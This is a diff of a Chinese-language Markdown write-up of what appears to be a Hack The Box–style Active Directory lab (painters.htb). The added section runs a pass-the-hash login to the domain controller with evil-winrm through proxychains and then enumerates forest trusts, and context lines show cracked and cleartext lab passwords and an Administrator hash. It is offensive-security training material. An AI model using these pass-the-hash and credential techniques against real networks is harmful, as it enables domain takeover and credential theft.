@@ -225,7 +225,7 @@ P@ssw0rd         (riley)
 Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
 Session completed.
 ```
-#### 问答环节
+<!-- #### 问答环节
 :::danger 问题
 ```
 1、在Linux的web网页，为什么会反弹出NTLMv2-SSP Hash 
@@ -236,7 +236,7 @@ Session completed.
 ```
 1、web网页只负责收集pdf，而hr工作的地方是Windows环境，hr在域内点击查看
 2、密码复用，是域内很常见的攻击方法
-```
+``` -->
 :::
 尝试登陆
 ```python
@@ -791,7 +791,7 @@ blake        Person       Constrained w/ Protocol Transition  CIFS/DC           
 daniel       Person       Constrained                         CIFS/dc.painters.htb  Yes        
 daniel       Person       Constrained                         CIFS/DC               Yes
 ```
-## 192.168.110.55
+## 192.168.110.55(dc)
 
 ### GetST.py
 ```python
@@ -962,3 +962,43 @@ painters.htb\Matt:CLEARTEXT:L1f30f4Spr1ngCh1ck3n!
 [-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
 [*] Cleaning up... 
 ```
+### PTH登陆域控
+```python
+┌──(root㉿Rookie)-[/home/rookie/Desktop]
+└─# proxychains evil-winrm -i 192.168.110.55 -u Administrator -H 5bdd6a33efe43f0dc7e3b2435579aa53
+
+[proxychains] config file found: /etc/proxychains.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+[proxychains] Strict chain  ...  192.248.165.125:60002  ...  192.168.110.55:5985  ...  OK
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
+```
+#### 发现域信任关系及ip
+```
+*Evil-WinRM* PS C:\Windows> nltest /domain_trusts
+List of domain trusts:
+    0: ZSM zsm.local (NT 5) (Direct Outbound) (Direct Inbound) ( Attr: foresttrans )
+    1: PAINTERS painters.htb (NT 5) (Forest Tree Root) (Primary Domain) (Native)
+The command completed successfully
+*Evil-WinRM* PS C:\Windows> ping zsm.local
+
+Pinging zsm.local [192.168.210.10] with 32 bytes of data:
+Reply from 192.168.210.10: bytes=32 time<1ms TTL=127
+Reply from 192.168.210.10: bytes=32 time<1ms TTL=127
+Reply from 192.168.210.10: bytes=32 time<1ms TTL=127
+Reply from 192.168.210.10: bytes=32 time<1ms TTL=127
+
+Ping statistics for 192.168.210.10:
+    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
+Approximate round trip times in milli-seconds:
+    Minimum = 0ms, Maximum = 0ms, Average = 0ms
+```
+## 192.168.210.0/24(nmap)
